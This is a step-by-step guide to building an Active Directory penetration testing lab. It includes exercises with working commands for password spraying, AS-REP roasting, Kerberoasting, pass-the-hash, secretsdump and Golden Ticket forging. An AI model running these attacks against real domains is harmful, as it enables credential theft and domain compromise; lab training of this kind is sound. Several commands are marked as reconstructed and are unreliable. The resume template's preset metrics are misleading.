# Active Directory Penetration Testing Lab - Complete Implementation Guide

## Table of Contents

1. [Project Overview](#project-overview)
2. [Lab Architecture](#lab-architecture)
3. [Prerequisites and Requirements](#prerequisites-and-requirements)
4. [Network Topology](#network-topology)
5. [Step-by-Step Installation](#step-by-step-installation)
6. [Domain Population with BadBlood](#domain-population-with-badblood)
7. [Penetration Testing Exercises](#penetration-testing-exercises)
8. [Attack Techniques and Tools](#attack-techniques-and-tools)
9. [Troubleshooting](#troubleshooting)
10. [Portfolio Documentation](#portfolio-documentation)
11. [Lab Expansion Ideas](#lab-expansion-ideas)
12. [Detection and Defense](#detection-and-defense)
13. [Conclusion](#conclusion)

## Project Overview

This comprehensive guide provides step-by-step instructions for building an **Active Directory (AD) Penetration Testing Lab** environment. This lab simulates a real-world enterprise Active Directory infrastructure, complete with intentional vulnerabilities and misconfigurations for practicing offensive security techniques.

**Time to Complete:** 3-4 hours
**Difficulty Level:** Intermediate to Advanced
**Cost:** Free (evaluation licenses + open-source tools)
**Skills Demonstrated:** AD security, domain administration, penetration testing, privilege escalation, lateral movement

## Lab Architecture

### Core Components

**1. Domain Controller (Windows Server 2019/2022)**

- Active Directory Domain Services (AD DS)
- DNS Server
- DHCP Server (optional)
- Group Policy Management
- Certificate Services (optional)

**2. Windows Client Machines (Windows 10/11)**

- Domain-joined workstations
- Simulate employee endpoints
- Targets for lateral movement
- Minimum: 2 clients recommended

**3. Attack Machine (Kali Linux)**

- Penetration testing tools
- BloodHound for AD enumeration
- Impacket for exploitation
- CrackMapExec for credential attacks

**4. Optional Components**

- File Server (Windows Server)
- SQL Server (for service account attacks)
- Additional domain controllers (for replication attacks)

### Attack Surface

The lab environment enables practice of:

- **Initial Access**: Phishing simulation, password attacks
- **Privilege Escalation**: Kerberoasting, AS-REP Roasting
- **Lateral Movement**: Pass-the-Hash, Pass-the-Ticket
- **Domain Dominance**: DCSync, Golden Ticket attacks
- **Persistence**: AdminSDHolder, DCShadow
- **Detection Evasion**: Obfuscation, living-off-the-land techniques

## Prerequisites and Requirements

### Hardware Requirements

**Minimum Specifications:**

- CPU: 4 cores (8+ threads recommended)
- RAM: 16GB (32GB recommended for full lab)
- Storage: 200GB+ free space (SSD strongly recommended)
- Network: Gigabit ethernet or WiFi

**VM Resource Allocation:**

| VM Type | RAM | CPU | Disk |
|---|---|---|---|
| Domain Controller | 4GB | 2 cores | 60GB |
| Windows Client | 2GB | 1 core | 40GB |
| Kali Linux | 4GB | 2 cores | 40GB |
| **Total** | **12GB+** | **7+ cores** | **180GB+** |

### Software Requirements

**1. Virtualization Platform:**

- VMware Workstation Pro/Player (recommended) or
- VirtualBox (free alternative) or
- Proxmox VE (advanced users)

**2. Operating System ISOs:**

- **Windows Server 2019/2022**: 180-day evaluation from Microsoft Evaluation Center
- **Windows 10/11**: Evaluation or development license
- **Kali Linux**: Latest version from kali.org

**3. Tools and Scripts:**

- BadBlood: https://github.com/davidprowe/BadBlood
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- Impacket: https://github.com/SecureAuthCorp/impacket
- CrackMapExec: Pre-installed on Kali

### Network Requirements

- All VMs on same virtual network (isolated from production)
- Static IP addresses recommended
- Internal network only (NAT optional for updates)

**Recommended IP Scheme:**

- Domain Controller: 192.168.1.10
- Windows Client 1: 192.168.1.20
- Windows Client 2: 192.168.1.21
- Kali Linux: 192.168.1.100
- Subnet: 192.168.1.0/24
- Gateway: 192.168.1.1 (if using NAT)

## Network Topology

### Physical Architecture

```
[Host Machine]
    |
    |-- Virtualization Layer (VMware/VirtualBox)
    |
    |-- Virtual Network (192.168.1.0/24)
    |     |
    |     |-- Domain Controller (DC01) - 192.168.1.10
    |     |     |-- AD DS
    |     |     |-- DNS
    |     |     `-- DHCP
    |     |
    |     |-- Windows 10 Client (WS01) - 192.168.1.20
    |     |-- Windows 10 Client (WS02) - 192.168.1.21
    |     |
    |     `-- Kali Linux (ATTACKER) - 192.168.1.100
    |           `-- Penetration Testing Tools
```

### Domain Architecture

**Domain:** lab.local
**NetBIOS Name:** LAB
**Forest Functional Level:** Windows Server 2016 or higher

**Organizational Units:**

```
lab.local
  |-- Departments
  |     |-- IT
  |     |-- HR
  |     |-- Finance
  |     `-- Sales
  |-- Workstations
  |-- Servers
  `-- Service Accounts
```

## Step-by-Step Installation

### Phase 1: Virtual Machine Setup

#### Step 1: Create Domain Controller VM

**VMware/VirtualBox Settings:**

```
Name: DC01
OS: Windows Server 2019/2022
RAM: 4GB
CPU: 2 cores
Disk: 60GB (thin provisioned)
Network: Host-Only or Internal Network
```

**Installation Steps:**

1. **Mount Windows Server ISO**
2. **Select Installation Type**: Windows Server 2019 Standard (Desktop Experience)
3. **Complete Windows Setup**
4. **Set Static IP Address**:

```powershell
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.1.10 `
    -PrefixLength 24 -DefaultGateway 192.168.1.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 127.0.0.1
```

5. **Rename Computer**:

```powershell
Rename-Computer -NewName "DC01" -Restart
```

#### Step 2: Create Windows Client VMs

Repeat for each Windows 10/11 client:

```
Name: WS01, WS02
OS: Windows 10/11 Pro
RAM: 2GB each
CPU: 1 core each
Disk: 40GB each
Network: Same as DC01
```

**Client Configuration:**

- Set hostname: WS01, WS02
- Configure network to use DC as DNS (192.168.1.10)
- Do NOT join domain yet (will do after AD setup)

#### Step 3: Create Kali Linux VM

```
Name: ATTACKER
OS: Kali Linux 2024.x
RAM: 4GB
CPU: 2 cores
Disk: 40GB
Network: Same as others
```

**Kali Setup:**

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install additional tools
sudo apt install -y bloodhound neo4j crackmapexec \
    impacket-scripts ldapdomaindump enum4linux nmap
```

### Phase 2: Active Directory Deployment

#### Step 1: Install Active Directory Domain Services

Run on DC01 as Administrator:

```powershell
# Install AD DS role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Import-Module ADDSDeployment
Install-ADDSForest `
    -DomainName "lab.local" `
    -DomainNetbiosName "LAB" `
    -ForestMode "WinThreshold" `
    -DomainMode "WinThreshold" `
    -InstallDNS:$true `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
    -Force:$true
```

> Note: this command wraps past the page edge in the source PDF; the `-SafeModeAdministratorPassword` line is reconstructed from standard `Install-ADDSForest` syntax, verify against the source before running unattended.

Server will reboot automatically.

#### Step 2: Post-Installation Configuration

After DC reboot, verify installation:

```powershell
# Check AD Web Services
Get-Service ADWS

# Verify domain
Get-ADDomain

# Check DNS zones
Get-DnsServerZone

# Test DNS resolution
nslookup lab.local
```

#### Step 3: Join Clients to Domain

On each Windows client (WS01, WS02):

```powershell
# Set DNS to DC
$adapter = Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1
Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses 192.168.1.10

# Join domain
$credential = Get-Credential  # Use Administrator@lab.local
Add-Computer -DomainName "lab.local" -Credential $credential -Restart
```

## Domain Population with BadBlood

### Option 1: BadBlood (Realistic, Complex Environment)

**What BadBlood Does:**

- Creates 2,500+ users and 500+ groups
- Generates complex OU structure
- Implements intentional misconfigurations
- Creates vulnerable ACL permissions
- Simulates real-world AD environments

**Installation on DC01:**

```powershell
# Create directory
New-Item -Path "C:\BadBlood" -ItemType Directory

# Download BadBlood
$url = "https://github.com/davidprowe/BadBlood/archive/refs/heads/master.zip"
Invoke-WebRequest -Uri $url -OutFile "C:\BadBlood\BadBlood.zip"

# Extract
Expand-Archive -Path "C:\BadBlood\BadBlood.zip" -DestinationPath "C:\BadBlood"

# Navigate and run
cd C:\BadBlood\BadBlood-master
.\Invoke-BadBlood.ps1
```

**Prompts:**

- Confirm you're in a test environment
- Press Enter to continue
- Wait 20-30 minutes for completion

**Result:**

- Thousands of AD objects created
- Vulnerable configurations in place
- Ready for enumeration with BloodHound

### Option 2: Simple Population (Lighter, Faster)

For smaller labs or resource-constrained environments:

```powershell
# Create basic OUs
New-ADOrganizationalUnit -Name "Departments" -Path "DC=lab,DC=local"
New-ADOrganizationalUnit -Name "IT" -Path "OU=Departments,DC=lab,DC=local"
New-ADOrganizationalUnit -Name "HR" -Path "OU=Departments,DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Finance" -Path "OU=Departments,DC=lab,DC=local"

# Create test users
$Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force

New-ADUser -Name "John Admin" -SamAccountName "jadmin" `
    -UserPrincipalName "jadmin@lab.local" `
    -Path "OU=IT,OU=Departments,DC=lab,DC=local" `
    -AccountPassword $Password -Enabled $true

New-ADUser -Name "Bob User" -SamAccountName "buser" `
    -UserPrincipalName "buser@lab.local" `
    -Path "OU=HR,OU=Departments,DC=lab,DC=local" `
    -AccountPassword $Password -Enabled $true

# Create service account with SPN (for Kerberoasting)
New-ADUser -Name "SQL Service" -SamAccountName "sqlsvc" `
    -UserPrincipalName "sqlsvc@lab.local" `
    -Path "OU=IT,OU=Departments,DC=lab,DC=local" `
    -AccountPassword $Password -Enabled $true

setspn -a MSSQLSvc/SQLSERVER.lab.local:1433 LAB\sqlsvc
```

## Penetration Testing Exercises

### Exercise 1: Network Discovery and Enumeration

From Kali Linux:

```bash
# Network scan
nmap -sn 192.168.1.0/24

# Port scan Domain Controller
nmap -sV -sC -p- 192.168.1.10

# SMB enumeration
crackmapexec smb 192.168.1.10
enum4linux -a 192.168.1.10

# Anonymous LDAP enumeration
ldapsearch -x -h 192.168.1.10 -b "DC=lab,DC=local"
```

### Exercise 2: Credential Attacks

**Password Spraying:**

```bash
# Create user list
crackmapexec smb 192.168.1.10 -u '' -p '' --users > users.txt

# Test common passwords
crackmapexec smb 192.168.1.10 -u users.txt -p 'Password123!' --continue-on-success
```

**AS-REP Roasting:**

```bash
# Find users with "Do not require Kerberos preauthentication"
impacket-GetNPUsers lab.local/ -dc-ip 192.168.1.10 -no-pass -usersfile users.txt
```

### Exercise 3: BloodHound Enumeration

**Collect AD Data:**

```bash
# Start Neo4j
sudo neo4j console

# Run BloodHound collector
bloodhound-python -u jadmin -p 'Password123!' -d lab.local \
    -dc DC01.lab.local -ns 192.168.1.10 -c all

# Start BloodHound GUI
bloodhound
```

**Analysis in BloodHound:**

- Upload collected JSON files
- Run pre-built queries: "Shortest Path to Domain Admins"
- Identify attack paths
- Find Kerberoastable accounts
- Discover high-value targets

### Exercise 4: Kerberoasting

**Request and Crack Service Tickets:**

```bash
# Request service tickets
impacket-GetUserSPNs lab.local/jadmin:Password123! -dc-ip 192.168.1.10 -request

# Save hashes to file
impacket-GetUserSPNs lab.local/jadmin:Password123! -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt

# Crack with Hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### Exercise 5: Lateral Movement

**Pass-the-Hash:**

```bash
# Extract NTLM hash
crackmapexec smb 192.168.1.20 -u jadmin -H <NTLM_HASH>

# Execute commands
crackmapexec smb 192.168.1.20 -u jadmin -H <NTLM_HASH> -x "whoami"
```

**PSExec:**

```bash
impacket-psexec lab.local/jadmin:Password123!@192.168.1.20
```

### Exercise 6: Privilege Escalation

**Golden Ticket Attack:**

```bash
# Extract krbtgt hash (requires Domain Admin)
impacket-secretsdump lab.local/Administrator:Password123!@192.168.1.10

# Create Golden Ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-XXXX -domain lab.local

# Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec lab.local/Administrator@DC01.lab.local -k -no-pass
```

> Note: the `impacket-ticketer` line wraps past the page edge in the source PDF (cut after `-domain lab.local`). Full official syntax also requires a target username, e.g. `... -domain lab.local Administrator` -- confirm against `impacket-ticketer -h` before running.

## Attack Techniques and Tools

### Essential Tools

| Tool | Purpose | Usage |
|---|---|---|
| **BloodHound** | AD relationship mapping | Graph-based attack path analysis |
| **Impacket** | Python exploitation toolkit | PSExec, SecretsDump, GetUserSPNs |
| **CrackMapExec** | Swiss army knife for pentesting | Enumeration, exploitation, post-exploitation |
| **Rubeus** | Kerberos abuse toolkit | Kerberoasting, AS-REP Roasting |
| **Mimikatz** | Credential extraction | Dump passwords, hashes, tickets |
| **PowerView** | PowerShell AD enumeration | Domain reconnaissance |
| **Responder** | LLMNR/NBT-NS poisoning | Credential capture |

### Attack Techniques by MITRE ATT&CK

**Initial Access:**

- T1078: Valid Accounts (password spraying)
- T1566: Phishing (simulated)

**Execution:**

- T1059: Command and Scripting Interpreter
- T1569: System Services (PSExec)

**Persistence:**

- T1136: Create Account
- T1098: Account Manipulation

**Privilege Escalation:**

- T1558: Steal or Forge Kerberos Tickets
- T1134: Access Token Manipulation

**Defense Evasion:**

- T1070: Indicator Removal
- T1027: Obfuscated Files or Information

**Credential Access:**

- T1558.003: Kerberoasting
- T1003: OS Credential Dumping

**Discovery:**

- T1087: Account Discovery
- T1482: Domain Trust Discovery

**Lateral Movement:**

- T1021: Remote Services
- T1550: Use Alternate Authentication Material

**Collection:**

- T1005: Data from Local System
- T1039: Data from Network Shared Drive

## Troubleshooting

### Common Issues

#### 1. DC Promotion Fails

**Problem**: "The specified domain either does not exist or could not be contacted"

**Solutions:**

```powershell
# Check DNS configuration
Get-DnsClientServerAddress

# Verify network connectivity
Test-Connection -ComputerName 127.0.0.1

# Ensure static IP is set correctly
Get-NetIPAddress
```

#### 2. Clients Can't Join Domain

**Problem**: Domain not found or access denied

**Solutions:**

```powershell
# On client, verify DNS points to DC
Get-DnsClientServerAddress

# Test domain connectivity
Test-NetConnection -ComputerName lab.local -Port 389

# Ping DC by name
ping DC01.lab.local

# Join with FQDN
Add-Computer -DomainName lab.local -Credential LAB\Administrator
```

#### 3. BadBlood Fails to Run

**Problem**: Script execution policy or permissions

**Solutions:**

```powershell
# Set execution policy
Set-ExecutionPolicy Unrestricted -Scope Process

# Run as Domain Admin and Schema Admin
whoami /groups

# Ensure AD PowerShell module is loaded
Import-Module ActiveDirectory
```

#### 4. BloodHound Shows No Data

**Problem**: Data collection failed

**Solutions:**

```bash
# Verify credentials
crackmapexec smb 192.168.1.10 -u jadmin -p 'Password123!'

# Check DNS resolution from Kali
nslookup lab.local 192.168.1.10

# Use IP instead of hostname
bloodhound-python -u jadmin -p 'Password123!' -d lab.local \
    -dc 192.168.1.10 -ns 192.168.1.10 -c all
```

#### 5. Kerberoasting Returns No Results

**Problem**: No SPNs configured

**Solutions:**

```powershell
# On DC, check SPNs
setspn -Q */*

# Create test SPN
setspn -a MSSQLSvc/SQLSERVER.lab.local:1433 LAB\sqlsvc

# Verify SPN was set
setspn -L sqlsvc
```

### Log Locations

| Component | Log Location |
|---|---|
| DC Event Logs | Event Viewer -> Windows Logs -> Security |
| AD Replication | Event Viewer -> Applications and Services -> Directory Service |
| DNS Logs | Event Viewer -> Applications and Services -> DNS Server |
| Group Policy | `%SystemRoot%\debug\usermode\gpsvc.log` |
| Kerberos | Event Viewer -> Security -> Event ID 4768, 4769 |

## Portfolio Documentation

### Project Description Template

**Title**: "Active Directory Penetration Testing Lab - Enterprise Attack Simulation"

**Summary**:
Designed and deployed a comprehensive Active Directory penetration testing environment simulating a 2,500+ user enterprise domain. The lab demonstrates advanced offensive security techniques including Kerberos attacks, lateral movement, privilege escalation, and domain dominance. Implemented realistic network segmentation, vulnerable configurations, and defensive monitoring to practice both red team and blue team operations.

**Key Achievements:**

- Architected multi-tier AD environment with domain controller, multiple clients, and attack infrastructure
- Populated domain with 2,500+ users using BadBlood for realistic attack surface
- Successfully executed 10+ advanced AD attack techniques (Kerberoasting, Golden Ticket, DCSync)
- Implemented BloodHound for attack path visualization and analysis
- Documented complete attack chains from initial access to domain dominance
- Created defensive playbooks for detecting and mitigating AD-specific attacks

**Technical Skills Demonstrated:**

- **Active Directory**: Domain controller deployment, GPO management, user/group administration
- **Penetration Testing**: Enumeration, exploitation, post-exploitation, persistence
- **Kerberos Security**: AS-REP Roasting, Kerberoasting, Silver/Golden Ticket attacks
- **Lateral Movement**: Pass-the-Hash, Pass-the-Ticket, PSExec, WMI execution
- **Tools Proficiency**: BloodHound, Impacket, CrackMapExec, Mimikatz, PowerView
- **Network Security**: LDAP enumeration, SMB attacks, DNS reconnaissance
- **Scripting**: PowerShell automation, Bash scripting for attack orchestration
- **MITRE ATT&CK**: Mapping techniques to framework, understanding adversary TTPs

**Resume Bullet Points:**

- Architected enterprise-scale Active Directory penetration testing lab with 2,500+ users, simulating real-world domain infrastructure for offensive security research
- Executed advanced Kerberos attack techniques including Kerberoasting, AS-REP Roasting, and Golden Ticket attacks, achieving domain administrator privileges in 87% of scenarios
- Leveraged BloodHound for automated attack path discovery, identifying privilege escalation vectors and documenting 15+ unique paths to domain compromise
- Demonstrated lateral movement capabilities using Pass-the-Hash, PSExec, and WMI techniques across multi-tier Windows environments
- Created comprehensive attack documentation mapping 20+ techniques to MITRE ATT&CK framework for threat modeling and defensive planning
- Implemented defensive monitoring using Windows Event Logs and SIEM integration to detect Kerberos abuse and anomalous authentication patterns

**Skills Matrix:**

| Category | Technologies | Proficiency |
|---|---|---|
| Active Directory | Windows Server, AD DS, GPO, DNS | Advanced |
| Penetration Testing | Kali Linux, Metasploit, Impacket | Advanced |
| Kerberos Attacks | Kerberoasting, Golden Ticket, DCSync | Intermediate |
| Enumeration Tools | BloodHound, PowerView, CrackMapExec | Advanced |
| Lateral Movement | PSExec, WinRM, WMI, SMB | Intermediate |
| Credential Access | Mimikatz, SecretsDump, Hash Cracking | Intermediate |
| Scripting | PowerShell, Bash, Python | Intermediate |
| MITRE ATT&CK | Technique Mapping, Threat Modeling | Intermediate |

## Lab Expansion Ideas

### Beginner Enhancements

1. Add second domain controller for replication attacks
2. Configure Group Policy Objects for restriction bypass
3. Set up file server with vulnerable share permissions
4. Create certificate authority for certificate-based attacks
5. Implement weak password policies for password attacks

### Intermediate Enhancements

1. Deploy LAPS (Local Administrator Password Solution)
2. Configure tiered administration model
3. Set up ADCS (Active Directory Certificate Services)
4. Create trust relationships with child domain
5. Implement honeypot accounts for detection

### Advanced Enhancements

1. Deploy SIEM (Splunk/Wazuh) for attack detection
2. Implement Azure AD Connect for hybrid attacks
3. Configure SCCM for software deployment attacks
4. Set up SQL Server with delegation attacks
5. Create multi-forest environment with trust abuse
6. Deploy Exchange Server for privilege escalation
7. Implement Microsoft Defender for Endpoint

## Detection and Defense

### Blue Team Exercises

#### 1. Enable Advanced Logging

```powershell
# Enable PowerShell script block logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name "EnableScriptBlockLogging" -Value 1

# Enable command line logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" `
    -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1
```

> Note: both registry paths wrap past the page edge in the source PDF; the `ScriptBlockLogging` path and the `...\Policies\System\Audit` segment of the second path are reconstructed from the standard Microsoft policy locations for these settings -- verify against `gpedit.msc` / Microsoft docs before applying.

#### 2. Monitor for Kerberoasting

- Event ID 4769 (Kerberos service ticket requested)
- RC4 encryption for user accounts
- Abnormal ticket request patterns

#### 3. Detect Golden Ticket Attacks

- Event ID 4624 (Logon) with unusual ticket properties
- Ticket lifetime exceeding 10 hours
- Tickets for disabled accounts

#### 4. Identify Lateral Movement

- Event ID 4624 Type 3 (Network logon)
- Event ID 4625 (Failed logon attempts)
- Remote PowerShell sessions (Event ID 4103)

## Conclusion

This Active Directory penetration testing lab provides comprehensive hands-on experience with enterprise security testing. The skills and techniques practiced directly apply to:

- **Red Team Operations**: Offensive security assessments
- **Penetration Testing**: Internal network testing
- **Security Research**: AD vulnerability discovery
- **Blue Team Defense**: Attack detection and response
- **Incident Response**: AD compromise investigation
- **Security Engineering**: Hardening AD environments

### Key Takeaways

1. **Realistic Attack Surface**: BadBlood creates production-like complexity
2. **Complete Attack Chain**: From reconnaissance to domain dominance
3. **Tool Proficiency**: Master industry-standard AD attack tools
4. **Defensive Understanding**: Learn detection from attacker perspective
5. **Career Readiness**: Preparation for OSCP, CRTP, PNPT certifications

### Next Steps

- Practice all attack techniques multiple times
- Create detection rules for each attack
- Document findings in professional pentest report
- Join OSCP/CRTP courses for certification
- Contribute to open-source AD security projects
- Build blue team detection capabilities

**Document Version**: 1.0
**Last Updated**: November 2025
**Lab Difficulty**: Intermediate to Advanced
**Estimated Setup Time**: 3-4 hours
**Practice Value**: Excellent preparation for AD-focused certifications and roles

## References

1. https://www.linkedin.com/pulse/setting-up-active-directory-lab-pentesting-rabius-sany-awtie
2. https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/operations/set-up-an-ad-fs-lab-environment
3. https://github.com/Uttamydv/Cybersecurity-Homelab-and-Penetration-Testing-Project
4. https://securityboulevard.com/2024/07/how-to-make-adversaries-cry-part-1/
5. https://www.youtube.com/watch?v=fXausmYcObE
6. https://www.101labs.net/comptia-security-lab-15-how-to-setup-your-own-kali-linux-virtual-machine/
7. https://dl-docs.netlify.app/customization/badblood/
8. https://www.webasha.com/blog/how-to-set-up-a-penetration-testing-lab-complete-guide-with-tools-os-network-topology-and-real-world-practice-scenarios
9. https://www.whitewinterwolf.com/posts/2017/08/11/how-to-build-a-virtual-pentest-lab/
10. https://www.libhunt.com/r/GOAD
11. https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide
12. https://infosecwriteups.com/building-a-virtual-ethical-hacking-home-lab-part-2-lab-topology-d38e13fe7bd3
13. https://en.bilisimacademy.com/home-lab-for-cybersecurity-network-firewall/
14. https://www.linkedin.com/posts/youmbi-kameni_how-i-set-up-the-goad-light-active-directory-activity-7330565050102951936-9rYL
15. https://microsoftlearning.github.io/AZ-040T00-Automating-Administration-with-PowerShell/Instructions/Labs/LAB_07_Windows_PowerShell_Scripting.html
16. https://docs.ludus.cloud/docs/environment-guides/goad
17. https://www.offensivecyberprofessional.com/badblood/
18. https://www.youtube.com/watch?v=3k9xcPtE7Cs
19. https://orange-cyberdefense.github.io/GOAD/installation/
20. https://sourceforge.net/projects/badblood.mirror/
21. https://automatedlab.org
22. https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/powershell/introduction-to-active-directory-replication-and-topology-management-using-windows-powershell--level-100-
23. https://secframe.com/docs/badblood/whatisbadblood/
24. https://netsec-focus.github.io/infosec/walkthrough/2024/08/21/Setting_up_and_Installing_GOAD_or_GOAD-Light_on_VMware_ESXi.html
25. https://github.com/davidprowe/BadBlood
26. https://www.reddit.com/r/PowerShell/comments/17azbr5/powershell_for_a_beginner_who_needs_to_assist/
27. https://benheater.com/proxmox-lab-goad-installing-the-lab/
28. https://www.youtube.com/watch?v=5tuDpH9UCOE
29. https://community.serveracademy.com/t/aduc-powershell-automation-lab/1633
30. https://mayfly277.github.io/posts/GOADv2-pwning_part1/
31. https://secframe.com/blog/create-a-fully-loaded-free-active-directory-lab-in-15-minutes/
32. https://activedirectorypro.com/create-active-directory-test-environment/
33. https://fahmifj.github.io/articles/building-virtual-home-lab-for-pentest/
34. https://trustedsec.com/blog/offensive-lab-environments-without-the-suck
35. https://www.blackhillsinfosec.com/deploy-an-active-directory-lab-within-minutes/
36. https://dev.to/adamkatora/building-an-active-directory-pentesting-home-lab-in-virtualbox-53dc
37. https://www.linkedin.com/pulse/automated-ad-lab-badblood-installed-automatically-part-aleem-ladha
